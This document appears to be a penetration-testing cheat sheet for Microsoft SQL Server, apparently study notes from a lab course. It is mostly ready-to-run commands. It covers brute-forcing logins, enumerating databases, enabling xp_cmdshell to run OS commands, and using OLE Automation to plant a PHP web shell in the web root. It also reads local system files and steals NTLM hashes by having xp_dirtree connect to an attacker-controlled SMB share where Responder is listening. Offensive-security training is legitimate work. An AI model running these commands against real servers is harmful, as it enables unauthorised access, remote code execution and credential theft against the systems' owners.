Bruteforce:

```bash
use auxiliary/scanner/mssql/mssql_login
```

Windows:

```bash
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

Linux:

```
mssqlclient.py -p 1433 julio@10.129.203.7
mssqlclient.py -p 1433 julio@10.129.203.7 -windows-auth 
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h - (Windows Auth)
```

sqlsh

Use `-m vert/ascii` to format the tables

`vert`: Displays results in a vertical format (one column per row), useful for long rows.
`ascii`: Creates clean ASCII table output with aligned columns.

View Databases:

```bash
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

Select Database:

```bash
1> USE <database>
2> go
```

Show Tables:

```bash
1> SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES
2> GO
```

XP_CMDSHELL

Enable:

```bash
1> EXECUTE sp_configure 'show advanced options', 1
2> GO

-- To update the currently configured value for advanced options.  
1> RECONFIGURE
2> GO  

-- To enable the feature.  
1> EXECUTE sp_configure 'xp_cmdshell', 1
2> GO  

-- To update the currently configured value for this feature.  
1> RECONFIGURE
2> GO
```

View table:

```bash
1> SELECT * FROM <table_name>
2> go
```

Command Execution:

```bash
1> xp_cmdshell 'whoami'
2> GO
```

Write Files

Need to enable Ole Automation Procedures

```bash
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

Create a file:

```bash
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

Read Local Files

```bash
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

Stealing User Hash

```bash
auxiliary/admin/mssql/mssql_ntlm_stealer
EXEC master..xp_dirtree '\\10.10.15.65\share\'

responder -I <interface>
```